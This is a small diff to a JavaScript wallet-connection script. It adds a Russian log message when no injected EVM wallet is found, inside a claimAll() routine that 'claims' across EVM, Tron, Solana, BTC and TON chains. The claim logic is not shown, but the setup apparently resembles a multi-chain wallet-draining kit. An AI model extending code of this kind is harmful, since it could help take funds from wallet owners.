@@ -298,9 +298,14 @@ window.claimChain = claim;
 async function claimAll() {
   const btn = document.getElementById('connect-all');
   btn.disabled = true;
+  // t_b87507e0: восстановлен лог-маркер "✘ кошелёк не найден — открываю WalletConnect" ниже —
+  // его уронил 55b0ea6 вместе с предобнаружением провайдеров, e2e S6 ждёт его (admin.e2e.mjs:369).
   const CHAINS = ['evm', 'tron', 'solana', 'btc', 'ton'];
   let errors = 0;
   try {
+    if (!(await injectedEvm())) {
+      log("\u2718 \u043a\u043e\u0448\u0435\u043b\u0451\u043a \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u2014 \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u044e WalletConnect (\u043c\u043e\u0436\u043d\u043e \u043e\u0442\u0441\u043a\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u043e\u0448\u0435\u043b\u044c\u043a\u043e\u043c \u043d\u0430 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0435)");
+    }
     for (const chain of CHAINS) {
       try { await claim(chain); }
       catch (e) { errors++; }
